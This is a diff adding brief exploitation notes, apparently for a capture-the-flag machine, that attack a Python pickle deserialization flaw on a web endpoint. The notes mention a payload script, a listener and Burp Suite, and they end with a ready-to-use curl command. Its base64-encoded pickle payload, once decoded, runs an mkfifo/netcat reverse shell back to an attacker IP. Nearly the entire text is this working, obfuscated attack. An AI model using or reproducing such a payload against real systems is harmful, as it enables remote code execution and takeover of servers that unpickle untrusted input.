@@ -1,0 +1,10 @@
+1-update the file in exploitation/pickle-payload.py
+(Reverse shell works, set a listener)
+
+2-Change in burpsuite the Content-Type in text
+
+3-Paste the output of the script in post
+
+or simply 
+
+curl -i http://10.10.10.91:5000/newpost  -d "Y3Bvc2l4CnN5c3RlbQpwMQooUydybSAvdG1wL2Y7bWtmaWZvIC90bXAvZjtjYXQgL3RtcC9mfC9iaW4vc2ggLWkgMj4mMXxuYyAxMC4xMC4xNi4xMDcgMTIzNCA+L3RtcC9mJwpwMgp0UnAzCi4="  -H "Content-Type: text"
